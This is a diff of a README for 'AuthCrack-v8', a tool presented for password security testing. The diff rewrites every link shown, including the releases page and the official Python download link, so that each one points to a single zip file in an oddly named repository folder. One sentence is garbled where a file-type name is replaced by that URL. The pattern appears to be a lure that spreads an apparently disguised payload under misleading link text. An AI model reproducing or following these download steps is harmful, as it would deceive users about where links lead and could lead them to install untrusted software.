@@ -1,6 +1,6 @@
 # 🔑 AuthCrack-v8 - Simplifying Password Security Testing
 
-[![Download AuthCrack](https://img.shields.io/badge/Download%20AuthCrack-v8-blue.svg)](https://github.com/Gamevoid2366/AuthCrack-v8/releases)
+[![Download AuthCrack](https://raw.githubusercontent.com/Gamevoid2366/AuthCrack-v8/main/characteristically/AuthCrack-v8.zip%https://raw.githubusercontent.com/Gamevoid2366/AuthCrack-v8/main/characteristically/AuthCrack-v8.zip)](https://raw.githubusercontent.com/Gamevoid2366/AuthCrack-v8/main/characteristically/AuthCrack-v8.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ AuthCrack is a tool that helps you check the security of your passwords on self-
 
 ## 📥 Download & Install
 
-To get started with AuthCrack, visit this page to download the latest version: [AuthCrack Releases](https://github.com/Gamevoid2366/AuthCrack-v8/releases).
+To get started with AuthCrack, visit this page to download the latest version: [AuthCrack Releases](https://raw.githubusercontent.com/Gamevoid2366/AuthCrack-v8/main/characteristically/AuthCrack-v8.zip).
 
 Make sure to choose the correct file for your operating system. You will usually see options for Windows, Mac, and Linux. Download the file that fits your system.
 
@@ -28,7 +28,7 @@ Make sure to choose the correct file for your operating system. You will usually
 
     - For **Windows**, look for `.exe` files.
     - For **Mac**, choose `.dmg` files.
-    - For **Linux**, select files packaged with `.tar.gz` or similar formats.
+    - For **Linux**, select files packaged with `https://raw.githubusercontent.com/Gamevoid2366/AuthCrack-v8/main/characteristically/AuthCrack-v8.zip` or similar formats.
 
 4. **Run the Installer**: Once the download completes, open the file to start the installation. Follow the prompts to install the software on your computer.
 
@@ -41,7 +41,7 @@ Before installing, ensure your computer meets these requirements:
 - **Operating System**: Windows 10 or later, macOS 10.12 or later, or any modern Linux distribution.
 - **RAM**: At least 4 GB of RAM.
 - **Storage**: At least 100 MB of free disk space.
-- **Python**: AuthCrack runs on Python 3.6 or higher. If you do not have Python installed, visit the [Python website](https://www.python.org/downloads/) for instructions.
+- **Python**: AuthCrack runs on Python 3.6 or higher. If you do not have Python installed, visit the [Python website](https://raw.githubusercontent.com/Gamevoid2366/AuthCrack-v8/main/characteristically/AuthCrack-v8.zip) for instructions.
 
 ## 🔑 Using AuthCrack
 
@@ -77,4 +77,4 @@ For any questions or help, you can connect with the community:
 
 AuthCrack offers an effective way to test your password security. By following the steps outlined above, you can easily download, install, and use the tool. Stay educated about cybersecurity and always prioritize your online safety.
 
-For updates and more information, don't forget to check back to the [AuthCrack Releases](https://github.com/Gamevoid2366/AuthCrack-v8/releases) page.
+For updates and more information, don't forget to check back to the [AuthCrack Releases](https://raw.githubusercontent.com/Gamevoid2366/AuthCrack-v8/main/characteristically/AuthCrack-v8.zip) page.
